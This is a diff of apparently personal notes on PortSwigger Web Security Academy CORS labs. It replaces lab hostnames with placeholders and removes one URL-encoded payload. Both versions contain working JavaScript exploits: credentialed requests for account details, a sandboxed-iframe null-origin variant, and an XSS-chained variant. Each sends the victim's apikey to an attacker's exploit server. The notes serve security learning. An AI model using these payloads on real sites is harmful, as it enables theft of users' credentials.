@@ -35,12 +35,12 @@
 <script>
   function getadmin() {
       var res = JSON.parse(this.response)
-      fetch("https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?" + res.apikey);
+      fetch("https://<your-exploit>/accountdetails?" + res.apikey);
   }
   
   const request = new XMLHttpRequest();
   request.addEventListener("load", getadmin);
-  request.open("GET", "https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails", true);
+  request.open("GET", "https://<your-id>/accountdetails", true);
   request.withCredentials = true;
   request.send();
 </script>
@@ -52,13 +52,13 @@
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('get','https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails',true);
+req.open('get','https://<your-id>/accountdetails',true);
 req.withCredentials = true;
 req.send();
 
 function reqListener() {
 var res = JSON.parse(this.response)
-location = 'https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?' + res.apikey;
+location = 'https://<your-exploit>/accountdetails?' + res.apikey;
 };
 </script>"></iframe>
 ```
@@ -66,17 +66,14 @@ location = 'https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/
 - Use XSS with the first CORS exploit:
   ```html
   <script>
-    location="http://subdomain/?param=<%3Cscript%3Evar+req+%3D+new+XMLHttpRequest%28%29%3B+req.onload+%3D+reqListener%3B+req.open%28%27get%27%2C%27https%3A%2F%2F0a7f000b04d942c38151111c002900a6.web-security-academy.net%2FaccountDetails%27%2Ctrue%29%3B+req.withCredentials+%3D+true%3Breq.send%28%29%3Bfunction+reqListener%28%29+%7Bvar+res+%3D+JSON.parse%28this.response%29%3B+location%3D%27https%3A%2F%2Fexploit-0a350083041a4269817d1092013b00eb.exploit-server.net%2FaccountDetails%3Fkey%3D%27%2Bres.apikey%3B%7D%3B%3C%2Fscript%3E"
+    location="http://subdomain/?param=xss
   </script>
 
   hackvertor to urlencode
-  <@urlencode><script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a7f000b04d942c38151111c002900a6.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {var res = JSON.parse(this.response); location='https://exploit-0a350083041a4269817d1092013b00eb.exploit-server.net/accountDetails?key='+res.apikey;};</script><@/urlencode>
-  
-  Result:
-  %3Cscript%3Evar+req+%3D+new+XMLHttpRequest%28%29%3B+req.onload+%3D+reqListener%3B+req.open%28%27get%27%2C%27https%3A%2F%2F0a7f000b04d942c38151111c002900a6.web-security-academy.net%2FaccountDetails%27%2Ctrue%29%3B+req.withCredentials+%3D+true%3Breq.send%28%29%3Bfunction+reqListener%28%29+%7Bvar+res+%3D+JSON.parse%28this.response%29%3B+location%3D%27https%3A%2F%2Fexploit-0a350083041a4269817d1092013b00eb.exploit-server.net%2FaccountDetails%3Fkey%3D%27%2Bres.apikey%3B%7D%3B%3C%2Fscript%3E
+  <@urlencode><script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://<id>/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {var res = JSON.parse(this.response); location='https://<exploit>/accountDetails?key='+res.apikey;};</script><@/urlencode>
 
   Portswiggers solution:
-  <script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a7f000b04d942c38151111c002900a6.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a350083041a4269817d1092013b00eb.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>
+  <script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://<id>/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://<exploit>/log?key='%2bthis.responseText; };%3c/script>
   ```
 5. Breaking TLS with poorly configured CORS
 - This attack involves the following steps:
